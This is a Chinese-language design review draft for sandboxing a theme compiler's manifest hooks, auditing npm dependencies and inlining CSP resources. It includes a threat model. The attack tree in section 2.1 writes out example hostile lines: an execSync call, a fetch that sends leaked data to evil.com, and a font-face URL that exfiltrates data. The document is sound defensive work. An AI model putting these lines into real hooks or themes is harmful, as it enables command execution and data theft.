# P0-3 技术设计：沙箱命令执行 + 零 npm 依赖 + CSP

> 状态: **评审稿**
> 日期: 2026-08-23
> 失效模式: FM-4.3（compiler 供应链攻击 + manifest hooks 滥用）
> 上游依据: `docs/rfc/2026-08-22-theme-compiler-unified.md`（λ 方案）、`src/shared/safe-css.ts`（现有运行时 CSS 净化器）、`src/main/catalog/manifest-v2.schema.json`（Schema 约束基线）
> 范围: `src/compiler/`（新建 sandbox 与审计模块）、`docs/manifest-v3.schema.json`（hooks 字段扩展）、构建期依赖扫描

---

## 1. 背景与失效模式

### 1.1 失效模式陈述

FM-4.3 描述三条攻击链：

1. **供应链投毒**：compiler 子进程引入的外部 npm 依赖（当前为 `@adobe/leonardo-contrast-colors`）在编译期被污染，导致恶意代码在主题编译阶段即被执行。
2. **manifest hooks 滥用**：manifest schema v3 新增的 `hooks.preBuild` / `hooks.postBuild` 字段若接受任意字符串并 `new Function()` 执行，恶意主题包可在 compiler 进程内执行系统命令。
3. **CSS 触发 exploit**：主题 CSS 中包含精心构造的片段，触发 postcss 或类似解析器的已知漏洞，或利用 `CSS.registerProperty` / `CSS.supports` 的副作用通道执行非预期行为。

### 1.2 当前代码证据

| 证据 | 文件 | 行号/锚点 | 风险等级 |
|------|------|----------|:-------:|
| 外部 npm 依赖引入 | `scripts/leonardo-wrapper.mjs` | L9 `import { BackgroundColor, Color, Theme } from '@adobe/leonardo-contrast-colors'` | P1 |
| hooks 字段定义（λ RFC） | `docs/rfc/2026-08-22-theme-compiler-unified.md` | L235 `hooks?: { preBuild?: string; postBuild?: string }` | P1 |
| hooks.ts 模块（λ RFC 规划） | 同上 | L199 `hooks.ts ← pre/post transform hook 注册` | P1 |
| 运行时 CSS 净化器（仅覆盖运行期） | `src/shared/safe-css.ts` | L57-79 BLOCKED_PROPERTIES / BLOCKED_VALUE_PATTERNS | P2（覆盖缺口） |
| Electron 环境 CSS API | λ RFC | `CSS.supports` / `CSS.registerProperty` 可用 | P2 |
| postcss 在 devDependencies | `package.json` | L90 `@tailwindcss/postcss` | P2 |
| 内置 `additionalProperties: false` | `manifest-v2.schema.json` | L8, L80, L152, L234 等多处 | 正向防御（可复用） |

### 1.3 目标

1. **编译期零任意代码执行**：hooks 字段始终在隔离环境中运行，无法访问主进程 fs/net/child_process。
2. **npm 供应链攻击面最小化**：compiler 模块的外部依赖必须经过 audit 门，并提供纯标准库降级路径。
3. **CSS 产出内联化**：主题包安装产物中不出现外部 URL 引用，消除 exfil 通道。
4. **可验证、可回滚**：每次 `agentskin build` 输出依赖审计摘要，审计失败阻塞构建。

### 1.4 非目标

- 不替代 `src/shared/safe-css.ts` 的运行时注入净化职责（各管各的边界）。
- 不重构 CDP 注入引擎（L0-L4 不变）。
- 不为浏览器环境设计 CSP（仅 Electron 内嵌 window.session.setUserAgent 等效路径）。
- 不实现通用插件系统（hooks 是单一函数签名白名单，非任意模块加载）。

### 1.5 RFC 触发条件

| 触发条件 | 是否命中 | 说明 |
|---------|:-------:|------|
| 重构注入架构（L0-L4 注入层） | 否 | 注入器不变 |
| 新增 UI 页面（突破六页封顶） | 否 | 不新增页面 |
| 新增适配器（突破六适配器上限） | 否 | 不涉及 |
| **修改核心数据模型** | **是** | manifest schema v3 hooks 字段新增 `sandbox` 配置对象 |

**裁决**：命中"修改核心数据模型"触发器，需 RFC 评审。

---

## 2. 威胁建模

### 2.1 攻击树

```
FM-4.3 根节点: 恶意主题包在 compiler 进程内执行任意命令
├── 路径 A: 供应链投毒（npm 依赖）
│   ├── A1: @adobe/leonardo-contrast-colors 被污染 → install 时执行 postinstall 脚本
│   ├── A2: transitively 依赖的包被污染 → 运行时调用触发恶意逻辑
│   └── A3: typosquatting 包被引入（命名相似）
├── 路径 B: manifest hooks 滥用
│   ├── B1: hooks.preBuild 含 require('child_process').execSync('...')
│   ├── B2: hooks.postBuild 含 fetch('https://evil.com', {body: leakedData})
│   └── B3: hooks 通过闭包逃逸（利用 constructor.callee 上溯 scope）
└── 路径 C: CSS 触发 exploit
    ├── C1: @font-face src: url(https://evil.com/steal?=...) 数据外泄
    ├── C2: CSS.registerProperty 触发 OKLCH 解析漏洞
    └── C3: 正则 ReDoS 耗尽 compiler 子进程 CPU
```

### 2.2 攻击面评级

| 路径 | 可利用性 | 影响 | 现有缓解 | 残余风险 |
|------|:-------:|:----:|---------|:-------:|
| A1 (postinstall) | 中 | 高 | 无 | P1 |
| A2 (transitive) | 中 | 高 | 无 | P1 |
| A3 (typosquat) | 低 | 高 | 无 | P2 |
| B1 (child_process) | 高 | 临界 | 无 | P0 |
| B2 (data exfil) | 高 | 高 | 无 | P1 |
| B3 (closure escape) | 中 | 高 | 无 | P1 |
| C1 (font URL) | 高 | 中 | `safe-css.ts` 仅运行时 | P2 |
| C2 (registerProperty) | 低 | 中 | 无 | P3 |
| C3 (ReDoS) | 中 | 低 | 无 | P3 |

---

## 3. 零依赖策略设计

### 3.1 当前依赖审计清单

| 依赖 | 用途 | 替换方案 | 审计要求 |
|------|------|---------|---------|
| `@adobe/leonardo-contrast-colors` | 14-token 对比度驱动生成 | 纯 JS 实现 `contrast-ratios.ts`（WCAG 公式已有 `color-theory.mjs` 实现） | 若保留：npm audit 0 critical，lockfile 锁定 SHA |
| `@material/material-color-utilities` | MDC 调色板（分析用） | `oklch-utils.mjs` 已覆盖 OKLCH 转换 + gamut mapping | 同 |
| `colorthief` | 图片主色提取 | 保留（必需，无轻量替代）；锁定 NPM 官方包 | npm audit 0 critical |

### 3.2 标准库替代方案

| 需求 | 候选 | 推荐 | 理由 |
|------|------|------|------|
| CSS 解析 | ① postcss ② CSSStyleSheet API + regex ③ grass-wasm | **② + ③ 分层** | ② 在 Electron 主进程可用 CSSOM（无需额外依赖）；③ grass-wasm 作为严格模式 fallback，Rust 编译无 JS 运行时依赖 |
| Color contrast | ① leonardo ② `color-theory.mjs` 内 APCA 实现 | **②** | 已零依赖，WCAG 公式可验证 |
| Gamut mapping | ① chroma.js ② oklch-utils.mjs 内已有 | **②** | 已零依赖 |

### 3.3 依赖审核机制

新增 `src/compiler/dependency-audit.mjs` 构建期扫描脚本，在 `index.ts` 启动时自检：

1. **lockfile 静态分析**：解析 `package-lock.json`，提取 compiler 模块的依赖闭包，与允许白名单比对。
2. **npm audit JSON 解析**：执行 `npm audit --json`，断言 `critical === 0 && high === 0`。
3. **postinstall 脚本扫描**：检查所有 dependencies 的 `package.json` 是否包含 `scripts.postinstall` / `scripts.preinstall`，若有则阻塞构建并提示风险。
4. **SRI hash 校验**：对允许列表内的依赖，记录其 tarlock SHA512，后续构建比对。

> 白名单文件格式：`src/compiler/dependency-allowlist.json`，包含 `{name, versionRange, integrity, reason}` 四项，需人工评审变更。

### 3.4 降级路径

当 `dependency-audit.mjs` 检测到 0-day 漏洞或无法完成审计时：
- 编译器启用 **纯标准库降级模式**（LEONARDO_FALLBACK=1），跳过 `@adobe/leonardo-contrast-colors`，使用 `color-theory.mjs` 的 APCA 路径生成 palette。
- 降级模式在构建日志中显式标注 `⚠ DEPENDENCY_FALLBACK`。

---

## 4. 沙箱隔离设计

### 4.1 架构分层

```
┌─────────────────────────────────────────────────────────────────┐
│  compiler 主进程 (index.ts)                                     │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  dependency-audit.mjs (启动自检)                          │  │
│  │  sandbox.ts (子进程/隔离环境工厂)                          │  │
│  │  parse → tokenize → optimize → emit                       │  │
│  └───────────────────────────────────────────────────────────┘  │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  hooks 执行环境 (sandbox.ts)                              │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │  isolated-vm Context                                │  │  │
│  │  │  - 白名单 API: Math, JSON, Object, Array           │  │  │
│  │  │  - 禁止: require, process, global, constructor     │  │  │
│  │  │  - 超时: 5000ms (per hook)                         │  │  │
│  │  │  - 内存: 64MB (per isolate)                        │  │  │
│  │  │  - 输出: 仅接受 {tokens: Record<string,string>}    │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 技术选型对比

| 方案 | 隔离强度 | 性能 | 维护状态 | 推荐 |
|------|:-------:|:----:|:-------:|:----:|
| VM2 | 中（已知逃逸 CVE） | 高 | **已废弃** | ❌ |
| **isolated-vm** | 高（V8 isolate） | 高 | 活跃（npm 周下载 200w+） | ✅ |
| child_process + seccomp | 高 | 中 | 需平台适配 | 备选 |
| Worker Threads | 中 | 高 | Node 内置 | 辅助 |

**推荐**：主路径使用 `isolated-vm`；若引入新依赖成本不可接受，备选方案为 `child_process` + `--disallow-code-generation-from-strings` + 自定义 `--max-old-space-size=64`。

### 4.3 sandbox.ts 接口契约

```typescript
// 概念接口（不修改代码，仅设计描述）
interface SandboxConfig {
  timeoutMs: number;       // 默认 5000
  memoryMB: number;        // 默认 64
  allowedGlobals: string[]; // 白名单
}

interface HookResult {
  tokens: Record<string, string>;  // 仅允许 KV 输出
  logs: string[];                  // 受控日志通道
}

function executeHookInSandbox(
  hookSource: string,
  inputContext: Readonly<ThemeAst>,
  config: SandboxConfig
): Promise<HookResult>;
```

### 4.4 关键护栏

1. **禁止字符串代码生成**：子进程启动参数包含 `--disallow-code-generation-from-strings`（禁用 `eval` / `new Function` / `vm.runInContext`）。
2. **输出类型强约束**：hooks 返回值必须通过 JSON Schema 校验（`{tokens: {patternProperties: {'^--agentskin-': {type: 'string'}}}}`），非 conforming 输出被丢弃。
3. **单次执行隔离**：每个 hook 调用创建独立 isolate，执行完毕即释放，禁止跨调用状态残留。
4. **资源上限**：超时或内存溢出时 kill 子进程，构建日志记录 `HOOK_OOM` / `HOOK_TIMEOUT` 事件。

---

## 5. CSP 内联设计

### 5.1 主题包 CSP 策略

主题包安装时，compiler 在 `emit` 阶段生成 `agentskin-csp.json`，随 bundle 一起打包：

```json
{
  "version": 1,
  "directives": {
    "default-src": ["'none'"],
    "style-src": ["'self'"],
    "font-src": ["'self'"],
    "img-src": ["'self'", "data:"],
    "connect-src": ["'none'"],
    "script-src": ["'none'"],
    "object-src": ["'none'"],
    "base-uri": ["'none'"],
    "form-action": ["'none'"],
    "frame-ancestors": ["'none'"]
  }
}
```

### 5.2 内联约束

| 资源 | 策略 | 实现方式 |
|------|------|---------|
| 字体 | 全部 base64 内嵌为 `@font-face src: url(data:font/woff2;base64,...)` | `emit.ts` 在打包阶段读取字体文件并编码 |
| 图片/hero | 全部 base64 内嵌或 data URI | 复用 `build-theme-package.mjs` 已有的 zlib + base64 路径 |
| 外部 URL | **禁止** | `safe-css.ts` 的 `URL_HOSTILE_CHECK` 正则 + 构建期静态扫描双重拦截 |
| @import | **禁止** | 构建期扫描 + 运行时净化器双重拦截 |

### 5.3 Electron 集成点

- 主进程在创建 `BrowserWindow` 时读取 `agentskin-csp.json`，通过 `session.webRequest.onHeadersReceived` 注入 CSP header。
- 注入 header 仅对 `agentskin-theme://` 自定义协议生效，不影响宿主应用原有 CSP。

---

## 6. 代码改动点（仅列出，不修改代码）

| 操作 | 文件 | 改动描述 |
|------|------|---------|
| **新增** | `src/compiler/sandbox.ts` | isolated-vm 工厂 + 超时/内存控制 + 输出 Schema 校验 |
| **新增** | `src/compiler/dependency-audit.mjs` | 构建期依赖白名单校验 + npm audit 门 + postinstall 脚本扫描 |
| **新增** | `src/compiler/dependency-allowlist.json` | 允许依赖白名单（name/version/integrity/reason） |
| **新增** | `src/compiler/csp-emitter.ts` | emit 阶段生成 `agentskin-csp.json` + 字体/图片 base64 内嵌 |
| **修改** | `src/compiler/index.ts` | 启动时先调用 `dependency-audit.mjs`，审计失败阻塞构建 |
| **修改** | `src/compiler/hooks.ts`（λ RFC 规划） | 所有 hook 调用经 `sandbox.ts` 执行，禁止裸 `new Function()` |
| **修改** | `docs/manifest-v3.schema.json` | hooks 字段扩展为对象：`{ preBuild?: string; postBuild?: string; sandbox?: { timeout?: 5000; memoryMB?: 64 } }` |
| **修改** | `src/shared/safe-css.ts` | 新增 `compileTimeScan()` 纯函数，供 compiler 构建期复用（不替代运行时路径） |
| **修改** | `scripts/check-themes.mjs` | 新增 hooks 字段沙箱配置校验 + CSP 产物存在性校验 |

---

## 7. 风险与兜底

| # | 风险 | 等级 | 触发条件 | 兜底策略 | 检测机制 |
|---|:----:|:----:|----------|----------|----------|
| R1 | isolated-vm 引入新依赖，自身成为供应链攻击面 | P1 | isolated-vm 被污染 | 备选 child_process + seccomp 路径；dependency-audit 覆盖 isolated-vm 自身 | `npm audit --json` 每日 CI |
| R2 | 纯标准库降级模式生成的 palette 与 Leonardo 路径存在视觉偏差 | P2 | 触发 DEPENDENCY_FALLBACK | 视觉回归测试兜底；偏差 > ΔE 2.0 时阻塞发布 | 84 文件 pixel-diff |
| R3 | hooks 沙箱超时导致合法复杂构建失败 | P3 | 用户 hook 含重计算 | 构建日志明确提示超时字段；提供 `agentskin build --hook-timeout=10000` 覆盖 | 构建日志 `HOOK_TIMEOUT` 事件 |
| R4 | base64 内嵌导致主题包体积膨胀 | P2 | 大尺寸 hero 图片 | 单资源 2MB 上限；超限自动降采样至 1280px | `emit.ts` 体积校验 |
| R5 | CSP 注入与宿主应用现有策略冲突 | P2 | 宿主应用已设 CSP | 仅对 `agentskin-theme://` 协议注入；不修改宿主 header | 集成测试覆盖 |

---

## 8. 分批落地计划

| Phase | 周期 | 交付物 | 改动文件 | 验证方式 |
|:-----:|:----:|--------|----------|----------|
| **S1** | 3 天 | dependency-audit.mjs + allowlist | +2 文件 | `agentskin build` 审计失败时阻塞并输出可读报告 |
| **S2** | 5 天 | sandbox.ts + hooks.ts 接入 | +2 文件，~1 修改 | hooks 逃逸测试用例 100% 被拦截 |
| **S3** | 3 天 | csp-emitter.ts + base64 内嵌 | +1 文件，~2 修改 | 产物中 0 个外部 URL；CSP JSON 存在 |
| **S4** | 2 天 | safe-css.ts compileTimeScan + check-themes 扩展 | ~2 修改 | `npm run check` 全绿；新增 hooks 沙箱配置校验 |
| **S5** | 2 天 | 文档同步 + 降级路径端到端测试 | docs + 测试 | 手动触发 DEPENDENCY_FALLBACK 端到端通过 |

**总计：15 天（3 周）。**

---

## 9. 人工复核项

| # | 假设 | 验证难度 | 建议 |
|---|:----:|:--------:|------|
| H1 | isolated-vm 在 Electron 主进程加载 .node 原生模块无兼容问题 | 中 | 在 Windows x64 + macOS arm64 实测 |
| H2 | 纯标准库 OKLCH 路径在低配设备性能可接受（<100ms/主题） | 低 | 4 核 / 8GB 设备基准测试 |
| H3 | base64 内嵌字体后主题包体积增量 < 30% | 中 | 对现有 7 主题实测体积对比 |
| H4 | `agentskin-csp.json` 注入路径与 Electron 43 session API 兼容 | 低 | 查阅 Electron 43 docs 确认 onHeadersReceived 签名 |

---

## 10. 评审结论

| 评审人 | 日期 | 意见 | 签名 |
|--------|------|------|------|
| （待评审） | 2026-08-23 | — | — |

**未批前不改代码。批准后按 §8 Phase 顺序分批落地。**

---

> 本设计基于代码锚点：`scripts/leonardo-wrapper.mjs:9`（外部依赖引入）、`src/shared/safe-css.ts:57-79`（现有 CSS 净化规则）、`src/main/catalog/manifest-v2.schema.json:8`（Schema 约束基线）、`docs/rfc/2026-08-22-theme-compiler-unified.md:235`（hooks 字段定义）。
